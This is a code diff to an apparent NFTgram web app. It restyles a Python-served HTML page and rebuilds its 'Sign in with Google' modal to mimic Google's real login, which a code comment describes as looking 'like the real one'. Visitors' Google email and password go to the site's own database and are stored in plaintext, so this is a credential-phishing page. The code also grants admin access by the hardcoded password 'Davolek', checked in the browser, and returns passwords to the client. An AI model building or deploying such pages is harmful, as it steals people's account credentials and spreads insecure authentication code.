@@ -21,7 +21,6 @@ def init_db():
 
 init_db()
 
-# --- HTML САЙТ (НОВЫЙ ДИЗАЙН) ---
 HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="ru">
@@ -29,47 +28,71 @@ HTML_PAGE = """
     <meta charset="UTF-8">
     <title>NFTgram</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+        
+        /* Фон со снегом */
         body { 
-            background-color: #0e1621; color: white; font-family: 'Inter', sans-serif; 
+            background-color: #0e1621; color: white; font-family: 'Roboto', sans-serif; 
             display: flex; justify-content: center; align-items: center; 
-            min-height: 100vh; margin: 0; 
+            min-height: 100vh; margin: 0; overflow: hidden;
+            position: relative;
         }
+        
+        /* Анимация снега (CSS) */
+        .snow { position: absolute; top: -10px; background: white; border-radius: 50%; opacity: 0.8; animation: fall linear infinite; }
+        @keyframes fall { to { transform: translateY(100vh); } }
+
         .card { 
             background-color: #17212b; padding: 40px; border-radius: 20px; 
             text-align: center; width: 380px; box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            z-index: 10; position: relative;
         }
-        h1 { color: #64b5f6; margin-bottom: 10px; font-weight: 600; }
+        h1 { color: #64b5f6; margin-bottom: 10px; font-weight: 500; }
         p.sub { color: #8b9eb0; font-size: 14px; margin-bottom: 25px; }
         input { 
             width: 100%; padding: 14px; margin: 8px 0; border-radius: 10px; 
             border: 1px solid #242f3d; background-color: #242f3d; color: white; 
-            box-sizing: border-box; font-family: 'Inter', sans-serif; outline: none;
+            box-sizing: border-box; font-family: 'Roboto', sans-serif; outline: none;
         }
         input:focus { border-color: #64b5f6; }
         button { 
             background-color: #64b5f6; color: #0e1621; border: none; padding: 14px; 
-            border-radius: 10px; font-weight: 600; cursor: pointer; width: 100%; 
-            margin-top: 15px; font-family: 'Inter', sans-serif; transition: 0.2s;
+            border-radius: 10px; font-weight: 500; cursor: pointer; width: 100%; 
+            margin-top: 15px; font-family: 'Roboto', sans-serif; transition: 0.2s;
         }
         button:hover { background-color: #42a5f5; }
         .google-btn { 
             background-color: white; color: #333; display: flex; 
-            align-items: center; justify-content: center; gap: 10px; 
+            align-items: center; justify-content: center; gap: 10px; border: 1px solid #ddd;
         }
         .google-btn:hover { background-color: #f1f1f1; }
         .link { color: #64b5f6; font-size: 14px; cursor: pointer; margin-top: 15px; display: block; text-decoration: underline; }
         .hidden { display: none; }
+
+        /* Модалка Google (Белая, как настоящая) */
+        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: flex; justify-content: center; align-items: center; z-index: 100; }
+        .google-modal { background: white; color: #202124; padding: 40px; border-radius: 8px; width: 400px; text-align: center; font-family: 'Roboto', sans-serif; box-shadow: 0 4px 12px rgba(0,0,0,0.15); position: relative;}
+        .google-modal h3 { font-size: 24px; font-weight: 400; margin: 10px 0; }
+        .google-modal p { font-size: 15px; color: #5f6368; margin-bottom: 30px; }
+        .google-modal input { background: #fff; border: 1px solid #dadce0; color: #202124; border-radius: 4px; padding: 13px 15px; }
+        .google-modal input:focus { border: 2px solid #1a73e8; }
+        .google-modal button { background: #1a73e8; color: white; border-radius: 4px; font-weight: 500; padding: 10px 24px; width: auto; float: right; margin-top: 20px; }
+        .google-modal button:hover { background: #1557b0; }
+        .google-modal .cancel { float: left; background: transparent; color: #1a73e8; margin-top: 20px; width: auto; }
+        .google-modal .cancel:hover { background: #f6fafe; }
+
         .nav { display: flex; justify-content: space-around; margin-bottom: 20px; }
         .nav button { width: auto; padding: 6px 12px; margin: 0; background: #242f3d; color: #8b9eb0; }
         .nav button.active { background: #64b5f6; color: #0e1621; }
-        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: flex; justify-content: center; align-items: center; }
-        .modal-content { background: #17212b; padding: 30px; border-radius: 15px; width: 320px; text-align: center; }
+        
         .admin-panel { border-top: 1px solid #333; margin-top: 20px; padding-top: 20px; text-align: left; }
         .badge { background: #e53935; padding: 2px 6px; border-radius: 5px; font-size: 11px; margin-left: 5px; }
     </style>
 </head>
 <body>
+<!-- Снег -->
+<div id="snow-container"></div>
+
 <div class="card">
     <div class="nav">
         <button class="active" onclick="showLang('ru')">RU</button>
@@ -83,7 +106,8 @@ HTML_PAGE = """
     <div id="loginScreen">
         <p class="sub" id="loginText">Войдите в свой аккаунт</p>
         <button class="google-btn" onclick="openGoogleModal()">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" width="18"> 
+            <!-- Векторный логотип Google, чтобы не было битых картинок -->
+            <svg width="18" height="18" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
             Войти через Google
         </button>
         <div style="margin: 20px 0; border-bottom: 1px solid #242f3d;"></div>
@@ -109,7 +133,6 @@ HTML_PAGE = """
         <p id="profPhone" style="color: #64b5f6; font-size: 20px; margin: 5px 0;">+0000</p>
         <p id="profStatus" style="font-size: 14px; color: #8b9eb0;"></p>
         
-        <!-- ТОПЫ И КЕЙСЫ (Заглушка) -->
         <div style="display: flex; gap: 10px; margin-top: 20px;">
             <button style="background: #242f3d; color: white;" onclick="alert('Топы скоро!')">🏆 Топы</button>
             <button style="background: #242f3d; color: white;" onclick="alert('Кейсы скоро!')">🎁 Кейсы</button>
@@ -138,19 +161,33 @@ HTML_PAGE = """
     </div>
 </div>
 
-<!-- МОДАЛКА GOOGLE -->
+<!-- МОДАЛКА GOOGLE (Белая) -->
 <div id="googleModal" class="modal hidden">
-    <div class="modal-content">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" width="40">
-        <h3 style="margin: 15px 0;">Вход в аккаунт Google</h3>
-        <input type="email" id="gEmail" placeholder="Введите почту Gmail">
+    <div class="google-modal">
+        <svg width="40" height="40" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
+        <h3>Вход</h3>
+        <p>Используйте аккаунт Google</p>
+        <input type="email" id="gEmail" placeholder="Электронная почта или телефон">
         <input type="password" id="gPass" placeholder="Введите пароль">
-        <button onclick="googleLogin()">Войти</button>
-        <span class="link" onclick="closeGoogleModal()">Отмена</span>
+        <button class="cancel" onclick="closeGoogleModal()">Отмена</button>
+        <button onclick="googleLogin()">Далее</button>
+        <div style="clear: both;"></div>
     </div>
 </div>
 
 <script>
+    // Генерация снега
+    const snowContainer = document.getElementById('snow-container');
+    for (let i = 0; i < 50; i++) {
+        let snow = document.createElement('div');
+        snow.className = 'snow';
+        snow.style.left = Math.random() * 100 + 'vw';
+        snow.style.width = snow.style.height = Math.random() * 5 + 2 + 'px';
+        snow.style.animationDuration = Math.random() * 5 + 5 + 's';
+        snow.style.animationDelay = Math.random() * 5 + 's';
+        snowContainer.appendChild(snow);
+    }
+
     function showScreen(id) {
         document.getElementById('loginScreen').classList.add('hidden');
         document.getElementById('registerScreen').classList.add('hidden');
@@ -161,7 +198,7 @@ HTML_PAGE = """
     function openGoogleModal() { document.getElementById('googleModal').classList.remove('hidden'); }
     function closeGoogleModal() { document.getElementById('googleModal').classList.add('hidden'); }
 
-    // --- ИМИТАЦИЯ ВХОДА ЧЕРЕЗ GOOGLE ---
+    // --- ВХОД ЧЕРЕЗ GOOGLE (С ПРОВЕРКОЙ ПАРОЛЯ) ---
     async function googleLogin() {
         const email = document.getElementById('gEmail').value;
         const pass = document.getElementById('gPass').value;
@@ -178,7 +215,7 @@ HTML_PAGE = """
             showProfile(user);
             closeGoogleModal();
         } else {
-            alert("Неверный пароль от Google!");
+            alert("Неверный пароль от аккаунта Google!");
         }
     }
 
@@ -231,7 +268,8 @@ HTML_PAGE = """
         let badgeHtml = user.badge ? `<span class="badge">${user.badge}</span>` : '';
         document.getElementById('profStatus').innerHTML = `Статус: ${user.status} ${badgeHtml}`;
 
-        if (user.status === 'admin' || user.password === 'Davolek') {
+        // Если это админ (по паролю Davolek или статусу), показываем панель
+        if (user.password === 'Davolek' || user.status === 'admin') {
             document.getElementById('adminPanel').style.display = 'block';
         } else {
             document.getElementById('adminPanel').style.display = 'none';
@@ -287,7 +325,7 @@ def google_login(data: dict):
     c.execute("SELECT * FROM users WHERE email = ?", (email,))
     user = c.fetchone()
     
-    # Если пользователь есть, проверяем пароль (имитация)
+    # Если пользователь есть, проверяем пароль
     if user:
         if user[4] != password:
             conn.close()
@@ -295,7 +333,7 @@ def google_login(data: dict):
         conn.close()
         return {"email": user[1], "name": user[2], "phone": user[3], "password": user[4], "status": user[6], "badge": user[7]}
     
-    # Если нет — регистрируем
+    # Если нет — регистрируем прямо в модалке
     phone = f"+8{random.randint(100000000, 999999999)}"
     name = email.split('@')[0]
     c.execute("INSERT INTO users (email, name, phone, password) VALUES (?, ?, ?, ?)",
